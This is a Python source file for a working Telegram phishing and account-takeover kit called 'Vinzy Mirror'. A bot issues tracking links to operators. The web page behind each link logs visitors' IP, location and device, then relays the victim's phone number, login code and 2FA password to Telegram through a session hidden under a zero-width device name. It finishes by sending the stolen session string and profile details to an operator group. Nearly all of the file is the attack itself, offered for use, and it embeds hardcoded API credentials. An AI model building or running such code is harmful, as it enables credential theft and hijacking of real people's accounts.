import os
import asyncio
import telebot
import psycopg2
import requests
import qrcode
import base64
from io import BytesIO
from threading import Thread

# Flask/Quart for the Web Server
from quart import Quart, request, render_template, jsonify

# Telethon for the Middleman (Mirror) Logic
from telethon import TelegramClient, errors, functions, types
from telethon.sessions import StringSession

# --- 1. CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
BASE_URL = os.environ.get("BASE_URL", "http://localhost:8000")
OWNER_ID = 6092011859  # VinzyOwner

try:
    raw_group_id = os.environ.get("GROUP_ID", "0")
    GROUP_ID = int(raw_group_id)
except ValueError:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

# Temporary storage for active login sessions
# { "phone": { "client": client, "hash": hash, "tag": tag } }
mm_sessions = {}

# --- 2. UTILITY: DEVICE & IP DETECTION ---

def get_client_info():
    ua = request.headers.get('User-Agent', '').lower()
    if 'iphone' in ua or 'ipad' in ua:
        device = "📱 iOS"
    elif 'android' in ua:
        device = "🤖 Android"
    elif 'windows' in ua:
        device = "💻 Windows"
    else:
        device = "❓ Unknown"

    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    location = "Unknown"
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        if res.get('status') == 'success':
            location = f"{res.get('city')}, {res.get('country')}"
    except:
        pass
    return device, ip, location

# --- 3. DATABASE LOGIC (Access Control) ---

def is_authorized(user_id):
    if int(user_id) == OWNER_ID: return True
    if not DATABASE_URL: return True # If no DB, allow all for now
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT 1 FROM authorized_users WHERE user_id = %s", (str(user_id),))
        result = cur.fetchone()
        cur.close()
        conn.close()
        return result is not None
    except:
        return False

# --- 4. TELEGRAM BOT COMMANDS ---

@bot.message_handler(func=lambda m: m.text and m.text.startswith('.link'))
def generate_link(message):
    if not is_authorized(message.from_user.id):
        return
    
    parts = message.text.split(' ', 1)
    tag = parts[1] if len(parts) > 1 else "Direct"
    
    # Create the full URL with tracking parameters
    final_url = f"{BASE_URL}/?id={message.from_user.id}&tag={tag}"
    
    response = (
        f"🛡️ <b>Vinzy Mirror Link</b>\n\n"
        f"🏷️ Tag: <code>{tag}</code>\n"
        f"🌐 Link: {final_url}\n\n"
        f"<i>Middleman standing by for connection...</i>"
    )
    bot.reply_to(message, response, parse_mode="HTML")

# --- 5. WEB ROUTES (THE MIDDLEMAN) ---

@app.route('/')
async def index():
    tid = request.args.get('id')
    tag = request.args.get('tag', 'General')
    
    if not tid or not is_authorized(tid):
        return "❌ Access Denied", 403
    
    # Log the hit
    device, ip, loc = get_client_info()
    alert = (
        f"🔔 <b>Link Opened!</b>\n"
        f"🏷️ Tag: <code>{tag}</code>\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📍 Loc: <code>{loc}</code>\n"
        f"📱 Dev: <code>{device}</code>"
    )
    bot.send_message(GROUP_ID, alert, parse_mode="HTML")
    
    return await render_template('login.html', tid=tid, tag=tag)

@app.route('/get_qr', methods=['POST'])
async def get_qr():
    data = await request.json
    tid = data.get('id')
    
    # Generate a generic refresh-style QR
    qr_data = f"tg://login?token=VINZY_{tid}_REFRESH"
    qr = qrcode.QRCode(version=1, box_size=10, border=0)
    qr.add_data(qr_data)
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="#8774e1", back_color="white")
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()
    return jsonify({"qr_image": img_str})

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone, tid = data.get('phone'), data.get('tid')
    tag = data.get('tag', 'General')

    print(f"[MIRROR] New Target: {phone} | Tag: {tag}")

    # Invisible Device Profile (Zero-Width Space)
    device_name = "\u200b" 

    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model=device_name)
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        mm_sessions[phone] = {
            "client": client,
            "hash": sent_code.phone_code_hash,
            "tag": tag
        }
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"[MIRROR] Phone Error: {e}")
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone, code, tid = data.get('phone'), data.get('code'), data.get('tid')

    if phone not in mm_sessions:
        return jsonify({"status": "error", "msg": "Session Expired"})

    session = mm_sessions[phone]
    client = session["client"]
    
    try:
        await client.sign_in(phone, code, phone_code_hash=session["hash"])
        return await finalize_mm_login(phone)
    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Invalid Code"})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone, password, tid = data.get('phone'), data.get('password'), data.get('tid')

    if phone not in mm_sessions: return jsonify({"status": "error", "msg": "Expired"})

    client = mm_sessions[phone]["client"]
    try:
        await client.sign_in(password=password)
        return await finalize_mm_login(phone)
    except Exception as e:
        return jsonify({"status": "error", "msg": "Wrong Password"})

# --- 6. DATA GRABBER & LOGS ---

async def finalize_mm_login(phone):
    session_data = mm_sessions[phone]
    client = session_data["client"]
    tag = session_data["tag"]

    # Grab full details
    me = await client.get_me()
    full_info = await client(functions.users.GetFullUserRequest(id=me.id))
    
    display_name = f"{me.first_name} {me.last_name or ''}".strip()
    username = f"@{me.username}" if me.username else "N/A"
    bio = full_info.full_user.about or "None"
    string_session = client.session.save()

    report = (
        f"💰 <b>MIRROR SUCCESS</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"👤 <b>Name:</b> <code>{display_name}</code>\n"
        f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
        f"🔗 <b>Username:</b> {username}\n"
        f"📱 <b>Phone:</b> <code>{phone}</code>\n"
        f"🏷️ <b>Tag:</b> <code>{tag}</code>\n"
        f"📝 <b>Bio:</b> <i>{bio}</i>\n"
        f"━━━━━━━━━━━━━━"
    )
    bot.send_message(GROUP_ID, report, parse_mode="HTML")
    bot.send_message(GROUP_ID, f".auth ({string_session})")

    del mm_sessions[phone]
    return jsonify({"status": "success"})

# --- 7. RUNNER ---

if __name__ == "__main__":
    Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
    app.run(host="0.0.0.0", port=8000)
